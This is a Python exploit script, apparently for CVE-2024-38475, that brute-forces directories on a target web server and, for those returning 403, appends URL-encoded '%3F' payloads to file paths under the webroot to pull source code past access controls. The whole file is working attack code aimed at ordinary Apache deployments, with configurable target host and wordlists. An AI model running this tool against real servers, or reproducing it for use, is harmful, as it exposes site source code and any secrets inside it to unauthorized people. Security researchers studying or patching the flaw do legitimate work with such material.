
##
## beta-thing-tbh
##
## Credits: https://blog.orange.tw/ | https://x.com/orange_8361
##
## And.. https://github.com/p0in7s/CVE-2024-38475
## Some Ragnar princess idk lol
##

import os,sys,re
from termcolor import colored, cprint
import aiohttp
import asyncio
import argparse

##
##

# Configuration variables
webroot = '/var/www/html'  # The webroot path on the target server (no trailing slash)
directory_wordlist = 'dirs.txt'  # Wordlist for directory enumeration
file_wordlist = 'lolol.txt'  # Wordlist for file enumeration
schema = 'http'  # http or https
payloads = ["%3F", "%3Fooooo.php"]  # Payloads to test for source code disclosure

# List to hold directories that return a 403 status code
forbidden_directories = []

async def fetch(session, url):
    """
    Asynchronously fetches the URL and returns the response.
    """
    try:
        async with session.get(url, allow_redirects=False) as response:
            return response
    except aiohttp.ClientError as e:
        print(colored(f"Request error: {e}", "red"))
        return None

async def enumerate_directories(session, url_ip_domain):
    """
    Enumerates directories one level deep under the webroot.
    If a directory returns a 403 status code, it is added to the forbidden_directories list.
    """
    with open(directory_wordlist, 'r', errors='replace') as f:
        lines = [word.strip() for word in f.readlines()]  # Read and clean up lines
        tasks = []
        for line in lines:
            # Construct the full URL for the directory
            url = f"{schema}://{url_ip_domain}/{line}/"
            tasks.append(fetch(session, url))

        responses = await asyncio.gather(*tasks)

        for line, response in zip(lines, responses):
            if response and response.status == 403:
                print(colored(f"403 Forbidden - Directory found: {line}", "green"))
                forbidden_directories.append(line)

async def check_source_code_disclosure(session, url_ip_domain):
    """
    Tries to read files within the 403 directories using the provided payloads.
    The goal is to find source code disclosures.
    """
    with open(file_wordlist, 'r', errors='replace') as f:
        lines = [word.strip() for word in f.readlines()]  # Read and clean up lines
        tasks = []

        for directory in forbidden_directories:
            for line in lines:
                for payload in payloads:
                    # Construct the full URL to test for source code disclosure
                    url = f"{schema}://{url_ip_domain}/{directory}{webroot}/{line}{payload}"
                    tasks.append(fetch(session, url))

        responses = await asyncio.gather(*tasks)

        for response in responses:
            if response and response.status == 200:
                print(colored(f"200 OK - File found: {response.url}", "green"))

async def main():
    # Parse command-line arguments for target host
    parser = argparse.ArgumentParser(description="Web directory enumeration and source code disclosure check.")
    parser.add_argument("--host", default="127.0.0.1", help="Target IP or domain (default: 127.0.0.1)")
    args = parser.parse_args()

    url_ip_domain = args.host

    async with aiohttp.ClientSession() as session:
        # Enumerate directories and look for 403 Forbidden responses
        print(colored("\nEnumerating directories one level deep in webroot...", "yellow"))
        await enumerate_directories(session, url_ip_domain)

        # Attempt to find source code disclosures within 403 Forbidden directories
        print(colored("\nChecking for source code disclosures in 403 directories...", "yellow"))
        await check_source_code_disclosure(session, url_ip_domain)

if __name__ == "__main__":
    asyncio.run(main())

##
##
